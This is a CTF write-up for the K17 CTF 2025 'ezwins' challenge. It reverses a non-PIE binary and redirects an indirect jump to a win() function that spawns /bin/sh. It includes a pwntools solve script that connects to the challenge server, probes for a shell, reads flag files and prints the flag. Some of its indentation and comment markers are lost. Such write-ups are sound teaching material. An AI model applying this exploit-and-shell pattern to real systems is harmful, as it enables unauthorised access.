---
title: "Overview"
description: "category: reversing (with a light pwn twist)"
event: "K17 CTF"
year: 2025
category: pwn
tags: ["pwn","ghidra","pwntools"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "K17CTF_2025/pwn/ezwins"
featured: false
flagsHidden: false
---

> Imported from [K17CTF_2025/pwn/ezwins](https://github.com/R3izorr/CTF_writeup/tree/main/K17CTF_2025/pwn/ezwins).

# Overview

category: reversing (with a light pwn twist)

given: a single Linux binary “chal”

goal: gain code execution/trigger the hidden win() to get a shell and read the flag

# Analysis

### File info:
- Chal: **ELF 64-bit** LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=721a2bd2a42a853567e165a94dd30e70afc27536, for GNU/Linux 3.2.0, **not stripped**

### Checksec:
- RELRO: Partial

- Stack Canary: found

- NX: enabled

- **PIE: No PIE**

- RPATH/RUNPATH: none

- Symbols: present

### Program flow:
```
 ./chal
Hello! Let's get to know you a bit better.
What's your name?
chris
How old are you?
20
Segmentation fault (core dumped)
```


### Quick reversing (ghidra):
- Main prints two prompts, reads a name (safe; fgets) and then reads an integer age using scanf("%lld").
there is a function named **win** at **0x4011f6** which does **system("/bin/sh")**.
because PIE is disabled, the address of win is fixed at 0x4011f6.

### How control flow reaches win:
- By **sending the raw address 0x4011f6 as the “age”** doesn’t work; in gdb, giving 4198902 (which is 0x4011f6) crashes trying to jump to 0x4011. that tells us the program shifts the provided number right by 8 bits before using it as a target.
therefore we must send a number X such that (X >> 8) == 0x4011f6.
solution: X = 0x4011f6 << 8 = 0x4011f600 = 1074918912 (decimal).

# Exploit strategy:

provide any name (e.g., “AAAA”).

when asked for age, send 1074918912 (decimal).

program computes age >> 8 → 0x4011f6 and jumps/calls into win, giving a /bin/sh.

read the flag.

# Implementation (final solve script)
```python
#!/usr/bin/env python3
from pwn import *
import sys, time, os

---------- config ----------

exe = './chal' # local binary (if present)
context.log_level = 'info' # set 'debug' for more verbosity
win_addr = 0x4011f6 # from ghidra / nm
send_X = win_addr << 8 # must send this decimal -> 1074918912
name = b"AAAA"

----------------------------

gdbscript = '''
init-pwndbg
continue
'''

def start(argv=[], *a, **kw):
"""
Robust start helper:
- python3 solve.py -> local binary (if exists)
- python3 solve.py REMOTE host port
- python3 solve.py host port
"""
print("DEBUG: sys.argv =", sys.argv)

if args.GDB:
    if not os.path.exists(exe):
        raise SystemExit("Local exe not found for GDB run.")
    return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)

if 'REMOTE' in sys.argv:
    idx = sys.argv.index('REMOTE')
    if len(sys.argv) > idx + 2:
        host = sys.argv[idx + 1]
        port = int(sys.argv[idx + 2])
        return remote(host, port, *a, **kw)
    if len(sys.argv) > idx + 1 and ':' in sys.argv[idx + 1]:
        host, port = sys.argv[idx + 1].split(':',1)
        return remote(host, int(port), *a, **kw)
    raise SystemExit("Usage: python3 solve.py REMOTE host port")

if len(sys.argv) >= 3:
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
        return remote(host, port, *a, **kw)
    except Exception:
        pass

if os.path.exists(exe):
    return process([exe] + argv, *a, **kw)

raise SystemExit("No remote args found and local exe not present. Usage:\n"
                 "  python3 solve.py REMOTE host port\n  or\n"
                 "  python3 solve.py host port\n  or run locally with ./chal present")


io = start()

def safe_recv(timeout=0.5):
try:
return io.recv(timeout=timeout)
except EOFError:
return b''
except Exception:
return b''

try:
banner = safe_recv(timeout=1)
if banner:
log.info("Initial banner:\n" + banner.decode(errors='ignore'))

log.info("Sending name...")
io.sendline(name)

after_name = safe_recv(timeout=1)
if after_name:
    log.info("After name:\n" + after_name.decode(errors='ignore'))

log.info(f"Sending age -> decimal {send_X} (win << 8)")
io.sendline(str(send_X).encode() + b"\n")

time.sleep(0.2)
after_age = safe_recv(timeout=1)
if after_age:
    log.info("After sending age:\n" + after_age.decode(errors='ignore'))
else:
    log.info("No output after sending age (connection may have closed).")

# Probe for shell

try:
    marker = "CTF_MARKER_OK_123"
    log.info("Probing for shell by echoing a marker...")
    io.sendline(f"echo {marker}".encode())
    out = io.recvuntil(marker.encode(), timeout=2)
    log.success("Marker seen! Probably have a shell. Received:\n" + out.decode(errors='ignore'))

    # try some common flag paths quickly; drop to interactive either way
    for path in [b'/flag', b'/app/flag', b'/flag.txt', b'/app/flag.txt', b'/home/ctf/flag', b'/home/ctf/flag.txt']:
        io.sendline(b'cat ' + path)
        line = io.recvline(timeout=1)
        if line and b'No such file' not in line:
            log.success("Flag: " + line.decode(errors='ignore').strip())
            break

    io.interactive()

except EOFError:
    log.error("Remote closed connection while probing -> no shell obtained.")
    tail = safe_recv(timeout=1)
    if tail:
        log.info("Final bytes from server:\n" + tail.decode(errors='ignore'))
    raise SystemExit(1)
except Exception as e:
    log.warning("Timeout or probe failed: " + repr(e))
    tail = safe_recv(timeout=1)
    if tail:
        log.info("Recent bytes:\n" + tail.decode(errors='ignore'))
    raise SystemExit(1)


except Exception:
log.exception("Unhandled exception - dumping final bytes")
tail = safe_recv(timeout=1)
if tail:
log.info("Final bytes:\n" + tail.decode(errors='ignore'))
sys.exit(1)
```

# usage

local: python3 solve.py

remote (two-arg): python3 solve.py challenge.secso.cc 8001

remote (explicit keyword): python3 solve.py REMOTE challenge.secso.cc 8001

# proof

after sending the decimal 1074918912 the program jumps into win and spawns /bin/sh.

reading the flag yields:
### K17{d1dn7_kn0w_u_c0u1d_b3_4ddr355_0f_w1n_m4ny_y34r5_0ld}

# Takeaways

no PIE means function addresses are stable; you can lift them straight from ghidra/nm.

sometimes the program will mangle your integer before using it (here, a right shift by 8). gdb symptoms (jumping to a truncated address like 0x4011) are a great hint to re-check bit operations.

even with stack canary and NX, you can still win by steering an indirect call/jump to a fixed win() gadget.


